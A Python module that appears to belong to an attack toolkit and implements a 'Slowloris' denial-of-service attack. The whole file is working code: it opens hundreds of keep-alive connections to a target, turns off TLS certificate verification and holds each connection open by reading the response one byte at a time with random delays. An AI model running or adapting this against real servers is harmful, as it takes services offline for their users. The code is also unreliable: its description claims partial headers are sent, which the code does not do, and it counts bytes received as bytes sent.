import asyncio
import random
import ssl
from typing import Any

import aiohttp
import structlog

from attack.base import BaseAttacker

logger = structlog.get_logger(__name__)


class SlowlorisAttack(BaseAttacker):
    name = "slowloris"
    description = "Slowloris attack: opens many connections and sends partial HTTP headers slowly"

    async def run(
        self,
        target: str,
        port: int = 80,
        connections: int = 200,
        rate: int = 10,
        timeout: int = 120,
        **kwargs: Any,
    ) -> None:
        if not target.startswith(("http://", "https://")):
            target_url = f"http://{target}"
        else:
            target_url = target

        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        active_connections: list[asyncio.Task] = []

        async def hold_connection() -> None:
            session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=None, sock_connect=10),
                connector=aiohttp.TCPConnector(ssl=ssl_context, force_close=False),
            )
            try:
                async with session.get(
                    target_url,
                    headers={"User-Agent": f"Slowloris-{random.randint(1, 9999)}", "Connection": "keep-alive"},
                    timeout=aiohttp.ClientTimeout(total=timeout, sock_read=timeout),
                ) as resp:
                    chunk_iter = resp.content.iter_chunked(1)
                    while not self.session.is_stopped:
                        await self.session._pause_event.wait()
                        try:
                            async for _ in chunk_iter:
                                await asyncio.sleep(random.uniform(1.0, 5.0))
                                self.session.stats.packets_sent += 1
                                self.session.stats.bytes_sent += 1
                        except Exception:
                            break
            except Exception:
                pass
            finally:
                await session.close()

        async def connection_manager() -> None:
            while not self.session.is_stopped:
                await self.session._pause_event.wait()
                while len(active_connections) < connections:
                    task = asyncio.create_task(hold_connection())
                    active_connections.append(task)
                    await asyncio.sleep(0.01)
                await asyncio.sleep(1.0)

        manager = asyncio.create_task(connection_manager())

        try:
            await self.session.wait_for_stop()
        finally:
            manager.cancel()
            for task in active_connections:
                task.cancel()
            await asyncio.gather(manager, *active_connections, return_exceptions=True)
